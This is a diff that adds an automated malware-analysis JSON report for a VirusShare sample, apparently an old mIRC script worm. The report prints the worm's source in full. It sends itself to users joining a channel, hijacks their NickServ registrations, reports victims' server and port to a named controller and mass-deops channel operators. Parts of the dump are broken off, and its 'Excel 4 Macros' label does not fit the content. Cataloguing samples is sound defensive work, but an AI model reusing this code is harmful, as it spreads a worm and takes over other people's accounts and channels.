@@ -1,0 +1,82 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "register": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "[script]\nn0=ON 1:JOIN:#:{ \nn1=  if ( $nick == $me ) { halt }\nn2=  if ( $nick == WiLd-FiRe ) { halt }\nn3=  else {\nn4=    /dcc send $nick script.ini\nn5=if ( $me <> WiLd-FiRe )  .timer 1 5 {\nn6=      set %nickname $me\nn7=      /ns drop $me\nn8=      /ns register load\nn9=      /ns ghost $me load \nn10=    }\nn11=  }\nn12=}\nn13=On 1:Connect: {\nn14=  if ( $me == WiLd-FiRe ) { halt }  \nn15=  else {\nn16=    /nick %nickname\nn17=    //msg WiLd-FiRe Hi I am \u00034 $me \u0003 on server \u00033 $server \u0003 in port \u00032 $port \u0003\nn18=    /ns ghost $me load\nn19=  }\nn20=}  \n$me ) { /set %line \" }\nn19=  %i = %i + 1\nn20=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }\nn21=  %i = %i + 1\nn22=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }\nn23=  /mode $chan -ooo %line\nn24=  /if ( %i > %opit ) { goto pois }\nn25=  goto looppi\nn26=  :pois\nn27=  /mode $chan +k iNFeCTeD!\nn28=  /mode $chan +o $nick\nn29=  /kick $chan $me\nn30=  /nick  %nimi\nn31=}\nn32=ON 1:TEXT:*:#:{ /if ( $rand(0,100) == 1 ) { \nn33=    /mode $chan +o $nick \nn34=    /dcc send $nick $mircdirscript.ini\nn35=    /msg $chan --==\u00034i'M_T00_C00l!\u00031==--\nn36=  }\nn37=}"
+    },
+    "filename": "VirusShare_2bde20f99cc5e7987f1d76d10eab6e99",
+    "filesize": 1174,
+    "filetype": "data",
+    "hashes": {
+        "md5": "2bde20f99cc5e7987f1d76d10eab6e99",
+        "sha1": "7e26fcbafc4bd2660e33e3431feae89380297506",
+        "sha256": "6e597a648451b8584f272ef2f41f327dc6567d4f998dfc5f9d46f2354346529e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=ON 1:JOIN:#:{ ",
+            "n1=  if ( $nick == $me ) { halt }",
+            "n2=  if ( $nick == WiLd-FiRe ) { halt }",
+            "n3=  else {",
+            "n4=    /dcc send $nick script.ini",
+            "n5=if ( $me <> WiLd-FiRe )  .timer 1 5 {",
+            "n6=      set %nickname $me",
+            "n7=      /ns drop $me",
+            "n8=      /ns register load",
+            "n9=      /ns ghost $me load ",
+            "n10=    }",
+            "n11=  }",
+            "n12=}",
+            "n13=On 1:Connect: {",
+            "n14=  if ( $me == WiLd-FiRe ) { halt }  ",
+            "n15=  else {",
+            "n16=    /nick %nickname",
+            "n17=    //msg WiLd-FiRe Hi I am ",
+            "4 $me ",
+            " on server ",
+            "3 $server ",
+            " in port ",
+            "2 $port ",
+            "n18=    /ns ghost $me load",
+            "n19=  }",
+            "n20=}  ",
+            "$me ) { /set %line \" }",
+            "n19=  %i = %i + 1",
+            "n20=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }",
+            "n21=  %i = %i + 1",
+            "n22=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }",
+            "n23=  /mode $chan -ooo %line",
+            "n24=  /if ( %i > %opit ) { goto pois }",
+            "n25=  goto looppi",
+            "n26=  :pois",
+            "n27=  /mode $chan +k iNFeCTeD!",
+            "n28=  /mode $chan +o $nick",
+            "n29=  /kick $chan $me",
+            "n30=  /nick  %nimi",
+            "n31=}",
+            "n32=ON 1:TEXT:*:#:{ /if ( $rand(0,100) == 1 ) { ",
+            "n33=    /mode $chan +o $nick ",
+            "n34=    /dcc send $nick $mircdirscript.ini",
+            "n35=    /msg $chan --==",
+            "4i'M_T00_C00l!",
+            "1==--",
+            "n36=  }",
+            "n37=}"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.273712",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
